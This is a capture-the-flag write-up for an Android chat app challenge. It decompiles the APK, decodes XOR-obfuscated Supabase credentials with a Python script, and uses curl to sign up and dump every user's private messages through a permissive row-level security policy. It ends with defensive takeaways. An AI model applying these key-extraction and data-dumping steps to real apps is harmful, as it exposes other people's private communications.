# TextSafe Writeup

**CTF:** EschatonCTF 2026
**Category:** Android
**Author:** @psychoSherlock

## TL;DR

Decompile the APK, find obfuscated Supabase credentials hidden behind a XOR cipher, decode them, register a new user on the live backend, dump all the chat messages, read the flag in a conversation.

## The Story

Our boy psychoSherlock thinks his girlfriend is cheating on him. She installed this "secure" messaging app called TextSafe and stopped replying. He tried static analysis but couldn't crack it. We need to figure out who she's talking to and what they're sharing.

Spoiler: she's not cheating. But we'll get there.

## Step 1: Crack Open the APK

We get a single file: `com.mcsc.textsafe.apk`. Standard Android package. First thing, throw it at `jadx` to decompile it back into readable Java/Kotlin source:

```bash
jadx --no-res -d jadx_out com.mcsc.textsafe.apk
```

Poking around the decompiled source under `com/mcsc/textsafe/`, we find:

- `MainActivity.java` - Login screen with root detection and developer options checks
- `HomeActivity.java` - Home screen showing recent chats
- `ChatActivity.java` - The actual messaging screen
- `SignupActivity.java` - User registration
- `icons/IconManager.java` - This one's suspicious...

The app is a pretty standard Kotlin chat app built on top of **Supabase** (a Firebase alternative). It uses Supabase Auth for login, Postgrest for database queries, and Realtime for live message updates. Nothing fancy on the surface.

## Step 2: Find the Backend Credentials

The Supabase client is initialized in a class called `ue1.java`:

```java
public static final SupabaseClient a;

static {
    IconManager iconManager = IconManager.INSTANCE;
    SupabaseClientBuilder supabaseClientBuilder = new SupabaseClientBuilder(
        iconManager.getSupabaseUrl(),
        iconManager.getSupabaseKey()
    );
    // ... installs Auth, Postgrest, Realtime, Storage plugins ...
    a = supabaseClientBuilder.build();
}
```

So the URL and API key come from `IconManager`. Let's look at that class. Here's `getSupabaseUrl()`:

```java
public final String getSupabaseUrl() {
    // ...
    strF = k6.F(new String[]{
        "JRcnMydC", "YkwgJyEN", "IhkmOSUc", "LhEkOyYA",
        "PQI2NnoL", "OBMyITUL", "KE0wLA=="
    }, "", null, null, te1.l, 30);
    // ...
}
```

And `getSupabaseKey()` is similar but with more chunks. The credentials aren't stored in plaintext - they're split into Base64 chunks and run through some transform function `te1.l`. This is why pure static analysis was tricky. The challenge description even hints at this: "I tried many static analysis... but I just cant hack it."

## Step 3: Reverse the Obfuscation

Time to trace the decode path. `k6.F` is basically Kotlin's `joinToString()` - it iterates over the array and applies a transform function to each element before concatenating them.

The transform is `te1.l`, which is a `te1` instance with `j = 1`. Looking at its `invoke()` method, case 1:

```java
case 1:
    byte[] decoded = Base64.decode(str, 2);  // URL-safe Base64
    byte[] result = new byte[decoded.length];
    for (int i = 0; i < decoded.length; i++) {
        result[i] = (byte) (decoded[i] ^ yp1.f[i % 8]);
    }
    // returns new String(result)
```

So for each chunk it:
1. Base64 decodes it (flag `2` = URL-safe)
2. XORs every byte with a repeating 8-byte key from `yp1.f`

The XOR key lives in `yp1.java`:

```java
public static final int[] f = {77, 99, 83, 67, 84, 120, 83, 102};
```

That's `McSCTxSf` in ASCII.

## Step 4: Decode the Credentials

Quick Python script to do the decoding:

```python
import base64

key = [77, 99, 83, 67, 84, 120, 83, 102]  # "McSCTxSf"

def decode_chunk(b64_str):
    decoded = base64.urlsafe_b64decode(b64_str)
    result = bytearray(len(decoded))
    for i in range(len(decoded)):
        result[i] = decoded[i] ^ key[i % 8]
    return result.decode('utf-8')

url_chunks = ["JRcnMydC", "YkwgJyEN", "IhkmOSUc", "LhEkOyYA",
              "PQI2NnoL", "OBMyITUL", "KE0wLA=="]

key_chunks = [
    "KBoZKzY/MA8CChkKAQIaVwMKGjAdFgFTLg==",
    "DiplCj8ICzAOKWptMQEZFi5QHiobERkcKQ==",
    "FSE7Gjk+KTweKiAKOjI/PCQqZQo6NjgCFQ==",
    "GxU2LQJOMDEfCTAtMEwwCCUUChQCSRoPOg==",
    "JAA+eiciAC97Kj4FIRphUiQvEAkkIQs3JA==",
    "AgkWcBoSOBECNwZwGSwSFQQOBXc3OxpQAA==",
    "JyJnDRAhYCsZACsOHEh9Mx0uES4/QCofCg==",
    "IQgDNyYIHQk5BiEvEElmFgEsCXE5Ih0QDg==",
    "GSw7NRYWKQE="
]

url = "".join(decode_chunk(c) for c in url_chunks)
api_key = "".join(decode_chunk(c) for c in key_chunks)
print(f"URL: {url}")
print(f"Key: {api_key}")
```

Output:
```
URL: https://sduuozuzqdcrwxrxpaeu.supabase.co
Key: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJz...
```

We now have a live Supabase project URL and its anon (public) API key.

## Step 5: Talk to the Backend

With the credentials in hand, we can hit the Supabase REST API directly. First, let's grab the user profiles:

```bash
curl -s "$URL/rest/v1/profiles?select=*" \
  -H "apikey: $KEY" \
  -H "Authorization: Bearer $KEY"
```

This gives us the user list:

| Username | Full Name | Email |
|---|---|---|
| grumpycat | grumpycat | grumpycat@mcsc.space |
| mrnicecat | Mr Nice Cat | mrnicecat@mcsc.space |
| psychoSherlock | psychoSherlock | psychosherlock@mcsc.space |
| admin | admin | admin@mcsc.space |

Now let's try to read messages. Hitting `/rest/v1/messages` with just the anon key returns an empty array `[]`. The table has **Row Level Security (RLS)** enabled - you need to be an authenticated user to read messages.

## Step 6: Get Authenticated

Supabase Auth lets you sign up via API. So we just... register a new account:

```bash
curl -s "$URL/auth/v1/signup" \
  -H "apikey: $KEY" \
  -H "Content-Type: application/json" \
  -d '{"email":"ctfplayer@test.com","password":"TestPassword1234"}'
```

This returns a JWT access token. Apparently the RLS policy is just "authenticated users can read all messages" with no per-user filtering. Classic misconfiguration that makes this challenge solvable.

## Step 7: Dump the Messages

Using our shiny new auth token:

```bash
curl -s "$URL/rest/v1/messages?select=*&order=created_at.asc" \
  -H "apikey: $KEY" \
  -H "Authorization: Bearer $AUTH_TOKEN"
```

And we get the full conversation. Here's the interesting part - a chat between **grumpycat** (the girlfriend) and **mrnicecat** (Mr Nice Cat):

> **mrnicecat:** So what are we planning for his birthday?
> **grumpycat:** umm... idk
> **grumpycat:** maybe something special
> **mrnicecat:** does he know that we are texting?
> **grumpycat:** no
> **grumpycat:** but lets keep it secret
> **mrnicecat:** whats the secret of your long term relationship? You guys are so cute?
> **grumpycat:** the secret is: esch{th3re_1s_n0-s3cr3t_ju5t-p4ti3nc3}
> **mrnicecat:** that is your biggest secret
> **mrnicecat:** I think he loves u so much.
> **grumpycat:** thank you

Meanwhile psychoSherlock is texting grumpycat going "are you ok? why are you not responding?" and she's like "sorry I was sleeping" while literally planning his birthday surprise.

She wasn't cheating. They were planning a surprise birthday party. The "secret" she shared was the flag.

## Flag

```
esch{th3re_1s_n0-s3cr3t_ju5t-p4ti3nc3}
```

## Key Takeaways

- **Don't just do static analysis.** The challenge description literally tells you static analysis won't work. The credentials are obfuscated at rest but the real vulnerability is the live backend.
- **Supabase anon keys are public by design.** Security depends entirely on RLS policies. If your RLS says "any authenticated user can read everything," then anyone who can sign up can read everything.
- **XOR with a static key is not encryption.** It's obfuscation. Once you find the key (which is sitting right there in the binary), it's game over.
- **Don't suspect your girlfriend of cheating based on app usage.** She might just be planning your birthday party.
